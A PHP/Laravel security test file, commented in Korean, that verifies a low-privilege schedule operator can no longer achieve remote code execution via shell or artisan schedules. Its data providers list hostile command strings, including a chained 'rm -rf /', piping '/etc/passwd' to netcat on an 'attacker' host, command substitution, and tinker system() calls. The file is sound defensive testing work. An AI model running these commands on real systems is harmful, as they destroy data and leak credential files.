<?php

namespace Tests\Feature\Security;

use App\Enums\ScheduleResultStatus;
use App\Enums\ScheduleType;
use App\Models\Permission;
use App\Models\Role;
use App\Models\Schedule;
use App\Models\User;
use App\Services\ScheduleService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Process;
use Illuminate\Validation\ValidationException;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * 스케줄 command 를 통한 권한 상승형 RCE 를 차단하는지 검증한다.
 *
 * 보고서(KVE-2026-1567) 주 시나리오: `core.schedules.read/create/run` 만 위임받은 저권한
 * 계정이 Shell/Artisan 스케줄을 생성 → 즉시 실행하여 서버에서 임의 OS 명령·임의 PHP 코드를
 * 실행하는 경로. 저장 시점(store/update 422)과 실행 시점(runSchedule 차단) 양쪽을 검증한다.
 */
class ScheduleCommandGuardTest extends TestCase
{
    use RefreshDatabase;

    private User $operator;

    private string $token;

    protected function setUp(): void
    {
        parent::setUp();

        // 보고서 시나리오의 "스케줄 운영자" — 스케줄 권한만 위임, is_super=0
        $this->operator = $this->createScheduleOperator();
        $this->token = $this->operator->createToken('test-token')->plainTextToken;
    }

    // ========================================================================
    // 저장 시점 — store/update 422
    // ========================================================================

    /**
     * 게이트가 꺼진 기본 상태에서 저권한 계정의 shell 스케줄 생성은 422 로 거부된다.
     *
     * @param  string  $command  악성/미허용 shell command
     */
    #[DataProvider('maliciousShellCommandProvider')]
    public function test_store_rejects_shell_command_when_gate_disabled(string $command): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => 'rce 시도',
            'type' => ScheduleType::Shell->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 저권한 계정의 차단목록 artisan 스케줄 생성은 422 로 거부된다.
     *
     * @param  string  $command  차단목록 artisan command
     */
    #[DataProvider('deniedArtisanCommandProvider')]
    public function test_store_rejects_denylisted_artisan_command(string $command): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => 'artisan rce 시도',
            'type' => ScheduleType::Artisan->value,
            'command' => $command,
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    /**
     * 게이트를 켜고 실행 파일을 화이트리스트에 등록하면 정상 shell 스케줄 생성은 201 로 허용된다.
     */
    public function test_store_allows_whitelisted_shell_command_when_gate_enabled(): void
    {
        config([
            'schedule_security.shell.enabled' => true,
            'schedule_security.shell.allowed_binaries' => ['backup.sh'],
        ]);

        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '정상 백업 스케줄',
            'type' => ScheduleType::Shell->value,
            'command' => 'backup.sh --full',
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(201);
    }

    /**
     * 정상 artisan 스케줄 생성은 201 로 허용된다 (기본 허용 정책).
     */
    public function test_store_allows_normal_artisan_command(): void
    {
        $response = $this->authRequest()->postJson(route('api.admin.schedules.store'), [
            'name' => '캐시 정리 스케줄',
            'type' => ScheduleType::Artisan->value,
            'command' => 'cache:clear',
            'expression' => '* * * * *',
            'frequency' => 'everyMinute',
        ]);

        $response->assertStatus(201);
    }

    /**
     * 기존 shell 스케줄의 command 만 악성 값으로 바꾸는 update 요청도 422 로 거부된다
     * (PATCH 에 type 이 없어도 저장된 타입으로 폴백 검증).
     */
    public function test_update_rejects_malicious_shell_command_without_type_in_request(): void
    {
        $schedule = Schedule::create([
            'name' => '기존 스케줄',
            'type' => ScheduleType::Shell,
            'command' => 'backup.sh',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        $response = $this->authRequest()->putJson(
            route('api.admin.schedules.update', ['schedule' => $schedule->id]),
            ['command' => 'id; cat /etc/passwd']
        );

        $response->assertStatus(422);
        $response->assertJsonValidationErrors('command');
    }

    // ========================================================================
    // 실행 시점 — runSchedule 차단 (DB 직접 주입 값 방어)
    // ========================================================================

    /**
     * 게이트가 꺼진 상태에서 DB 에 직접 심어진 shell 스케줄은 실행 시점에 차단된다
     * (저장 검증을 우회해 들어온 값 방어 — 마지막 방어선).
     */
    public function test_run_blocks_shell_schedule_when_gate_disabled(): void
    {
        Process::fake();

        $schedule = Schedule::create([
            'name' => 'DB 직접 주입 shell',
            'type' => ScheduleType::Shell,
            'command' => 'id',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        $this->assertScheduleRunIsBlocked($schedule);
        Process::assertNothingRan();
    }

    /**
     * DB 에 직접 심어진 차단목록 artisan 스케줄은 실행 시점에 차단된다.
     */
    public function test_run_blocks_denylisted_artisan_schedule(): void
    {
        $schedule = Schedule::create([
            'name' => 'DB 직접 주입 artisan',
            'type' => ScheduleType::Artisan,
            'command' => 'tinker --execute=system("id");',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        $this->assertScheduleRunIsBlocked($schedule);
    }

    /**
     * 게이트 on + 화이트리스트 등록 시, 허용된 shell 스케줄은 인자 배열로 실행된다
     * (문자열이 아닌 배열 → `/bin/sh -c` 미경유).
     */
    public function test_run_executes_whitelisted_shell_command_as_argument_array(): void
    {
        config([
            'schedule_security.shell.enabled' => true,
            'schedule_security.shell.allowed_binaries' => ['backup.sh'],
        ]);
        Process::fake(['*' => Process::result('done', '', 0)]);

        $schedule = Schedule::create([
            'name' => '정상 백업',
            'type' => ScheduleType::Shell,
            'command' => 'backup.sh --full /var/data',
            'expression' => '* * * * *',
            'is_active' => true,
        ]);

        app(ScheduleService::class)->runSchedule($schedule);

        // 셸 미경유 검증: Process 에 문자열이 아닌 인자 배열이 전달됨
        Process::assertRan(function ($process) {
            return $process->command === ['backup.sh', '--full', '/var/data'];
        });
    }

    // ========================================================================
    // Helpers
    // ========================================================================

    /**
     * runSchedule 이 차단되어 실패 이력으로 기록되는지 단언합니다.
     *
     * runSchedule 은 실행 실패를 실패 이력으로 남긴 뒤 ValidationException 으로 전파한다.
     *
     * @param  Schedule  $schedule  실행 대상 스케줄
     */
    private function assertScheduleRunIsBlocked(Schedule $schedule): void
    {
        try {
            app(ScheduleService::class)->runSchedule($schedule);
            $this->fail("차단되어야 하는 스케줄이 실행됨: {$schedule->command}");
        } catch (ValidationException $e) {
            // 실행 실패 경로 — 아래에서 실패 이력을 확인한다
        }

        $this->assertSame(
            ScheduleResultStatus::Failed,
            $schedule->fresh()->last_result,
            "차단된 스케줄이 실패로 기록되지 않음: {$schedule->command}"
        );
    }

    /**
     * 인증된 JSON 요청 헬퍼.
     */
    private function authRequest(): static
    {
        return $this->withHeaders([
            'Authorization' => 'Bearer '.$this->token,
            'Accept' => 'application/json',
        ]);
    }

    /**
     * 스케줄 권한만 위임받은 저권한 "스케줄 운영자" 계정을 생성합니다.
     *
     * @return User is_super=0, core.schedules.read/create/update/run 만 보유
     */
    private function createScheduleOperator(): User
    {
        $user = User::factory()->create();

        $permissionIds = [];
        foreach (['core.schedules.read', 'core.schedules.create', 'core.schedules.update', 'core.schedules.run'] as $identifier) {
            $permission = Permission::firstOrCreate(
                ['identifier' => $identifier],
                [
                    'name' => json_encode(['ko' => $identifier, 'en' => $identifier]),
                    'description' => json_encode(['ko' => $identifier, 'en' => $identifier]),
                    'extension_type' => 'core',
                    'extension_identifier' => 'core',
                    'type' => 'admin',
                ]
            );
            $permissionIds[] = $permission->id;
        }

        $operatorRole = Role::create([
            'identifier' => 'schedule_operator_'.uniqid(),
            'name' => json_encode(['ko' => '스케줄 운영자', 'en' => 'Schedule Operator']),
            'is_active' => true,
        ]);
        $operatorRole->permissions()->sync($permissionIds);

        // isAdmin() 통과를 위한 admin 타입 역할 (설계상 admin 로그인 허용 — 진짜 결함은 능력 위임 범위)
        $adminRole = Role::firstOrCreate(
            ['identifier' => 'admin'],
            [
                'name' => json_encode(['ko' => '관리자', 'en' => 'Administrator']),
                'extension_type' => 'core',
                'extension_identifier' => 'core',
                'is_active' => true,
            ]
        );

        $user->roles()->attach($adminRole->id, ['assigned_at' => now()]);
        $user->roles()->attach($operatorRole->id, ['assigned_at' => now()]);

        return $user->fresh();
    }

    /**
     * 게이트 꺼진 상태에서 거부되어야 하는 shell command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function maliciousShellCommandProvider(): array
    {
        return [
            '임의 명령 (보고서 주 시나리오)' => ['id'],
            '체이닝' => ['backup.sh; rm -rf /'],
            '파이프 역쉘' => ['cat /etc/passwd | nc attacker 4444'],
            '명령치환' => ['echo $(id)'],
        ];
    }

    /**
     * 차단목록 artisan command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function deniedArtisanCommandProvider(): array
    {
        return [
            'tinker 임의 PHP 실행' => ['tinker --execute=system("id");'],
            'db:wipe 파괴적' => ['db:wipe'],
            'migrate:fresh 파괴적' => ['migrate:fresh'],
        ];
    }
}
